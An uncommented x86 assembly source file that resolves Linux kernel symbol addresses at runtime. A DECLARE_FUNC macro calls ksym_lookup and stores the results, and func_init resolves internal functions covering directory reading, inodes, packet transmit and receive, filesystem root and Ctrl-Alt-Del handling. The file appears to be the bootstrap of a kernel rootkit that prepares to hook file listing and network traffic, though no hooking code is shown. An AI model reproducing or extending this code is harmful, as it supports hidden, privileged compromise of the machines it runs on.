#ifdef _DEBUG_

#define DECLARE_FUNC(name, len)	\
	jmp 111f;	\
	name: .fill 4;	\
	name##_str: .asciz #name;	\
	111: \
	GET_ADDR(name##_str, %eax);	\
	movl $len, %edx;	\
	call ksym_lookup;	\
	testl %eax, %eax;	\
	jz 222f;	\
	movl %eax, %esi;	\
	SET_VAL32(name, %esi);	\
	GET_ADDR(name##_str, %eax);	\
	movl %eax, 4(%esp);	\
	movl %esi, 8(%esp);	\
	DPRINT("<3>%s at %lx\n");	\
	jmp 333f;	\
	222:	\
	movl $-2, %ebp;	\
	DPRINT("<3>%s not found\n"); \
	333:	

#else

#define DECLARE_FUNC(name, len)	\
	jmp 778f;	\
	name: .fill 4;	\
	778: \
	GET_STR("" #name, %eax);	\
	movl $len, %edx;	\
	call ksym_lookup;	\
	testl %eax, %eax;	\
	jnz 1f;	\
	movl $-1, %ebp;	\
	1:
#endif

sys_open: .fill 4
do_filp_open: .fill 4

// void func_init();
EXPORT_LABEL(func_init)
	PUSH_ALL
	subl $0x20, %esp

	DECLARE_FUNC(printk, 6)
	DECLARE_FUNC(unlock_new_inode, 16)
	DECLARE_FUNC(iget_locked, 11)
	DECLARE_FUNC(iput, 4)
	DECLARE_FUNC(dput, 4)
	DECLARE_FUNC(d_find_alias, 12)
	DECLARE_FUNC(dev_hard_start_xmit, 19)
	DECLARE_FUNC(__netdev_alloc_skb, 18)
	DECLARE_FUNC(dev_queue_xmit, 14)
	DECLARE_FUNC(__kmalloc, 9)
	DECLARE_FUNC(schedule_work, 13)
	DECLARE_FUNC(skb_over_panic, 14)
	DECLARE_FUNC(skb_gso_segment, 15)
	DECLARE_FUNC(kfree_skb, 9)
	DECLARE_FUNC(netif_receive_skb, 17)
	DECLARE_FUNC(ctrl_alt_del, 12)
	DECLARE_FUNC(deferred_cad, 12)
	DECLARE_FUNC(posix_lock_file, 15)
	DECLARE_FUNC(set_fs_root, 11)
	DECLARE_FUNC(do_path_lookup, 14)
	DECLARE_FUNC(vfs_readdir, 11)
	DECLARE_FUNC(init_special_inode, 18)
	DECLARE_FUNC(__follow_mount, 14)
	DECLARE_FUNC(follow_mount, 12)
	DECLARE_FUNC(shmem_truncate, 14)

	movl $1, %eax
	addl $0x20, %esp
	POP_ALL
	ret


